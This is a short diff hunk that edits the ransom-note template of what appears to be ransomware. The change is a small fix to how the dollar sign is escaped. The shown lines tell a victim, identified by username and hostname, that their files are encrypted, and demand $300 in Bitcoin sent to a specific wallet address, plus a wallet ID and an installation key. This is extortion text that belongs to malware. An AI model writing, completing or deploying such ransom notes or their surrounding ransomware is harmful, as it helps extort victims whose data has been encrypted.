@@ -34,7 +34,7 @@ User: $username@$hostname
 To decrypt your files, you must purchase the private key.
 
 Instructions:
-1. Send \$300 worth of Bitcoin to this address:
+1. Send $300 worth of Bitcoin to this address:
    1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
 
 2. Send your Bitcoin wallet ID and the following installation key to:
